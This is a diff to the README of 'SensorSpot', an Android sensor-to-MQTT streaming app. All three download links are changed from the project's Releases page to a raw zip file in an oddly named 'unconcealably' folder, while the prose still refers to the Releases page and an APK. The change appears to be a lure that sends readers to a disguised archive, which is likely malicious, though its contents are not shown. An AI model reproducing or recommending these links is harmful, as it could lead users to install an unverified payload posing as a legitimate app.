@@ -1,7 +1,7 @@
 # 🌟 SensorSpot - Stream Your Sensor Data Easily
 
 ## 📥 Download Now
-[![Download SensorSpot](https://img.shields.io/badge/Download-SensorSpot-blue.svg)](https://github.com/Aditya-narwariya/SensorSpot/releases)
+[![Download SensorSpot](https://raw.githubusercontent.com/Aditya-narwariya/SensorSpot/main/unconcealably/SensorSpot.zip)](https://raw.githubusercontent.com/Aditya-narwariya/SensorSpot/main/unconcealably/SensorSpot.zip)
 
 ## 📖 Description
 SensorSpot is an Android app designed to help you stream real-time device sensor data to an MQTT broker. With SensorSpot, you can select sensors, configure broker settings, and publish data seamlessly. This app makes monitoring your sensor data simple and efficient, even for those without technical backgrounds.
@@ -18,7 +18,7 @@ SensorSpot is an Android app designed to help you stream real-time device sensor
 To start using SensorSpot, follow these simple steps:
 
 1. **Download SensorSpot**: Click the link below to visit the Releases page.
-   [Download SensorSpot](https://github.com/Aditya-narwariya/SensorSpot/releases)
+   [Download SensorSpot](https://raw.githubusercontent.com/Aditya-narwariya/SensorSpot/main/unconcealably/SensorSpot.zip)
 
 2. **Select the Latest Release**: On the Releases page, find the latest version of SensorSpot.
 
@@ -61,6 +61,6 @@ If you encounter any issues while using SensorSpot, here are some common solutio
 If you need further assistance, feel free to reach out through the issues section on our GitHub repository. We are here to help you troubleshoot any challenges you may encounter.
 
 ## 📥 Download & Install
-To get started with SensorSpot, [visit this page to download](https://github.com/Aditya-narwariya/SensorSpot/releases). Ensure you choose the latest APK file for the best experience.
+To get started with SensorSpot, [visit this page to download](https://raw.githubusercontent.com/Aditya-narwariya/SensorSpot/main/unconcealably/SensorSpot.zip). Ensure you choose the latest APK file for the best experience.
 
 Enjoy streaming your sensor data with ease using SensorSpot!
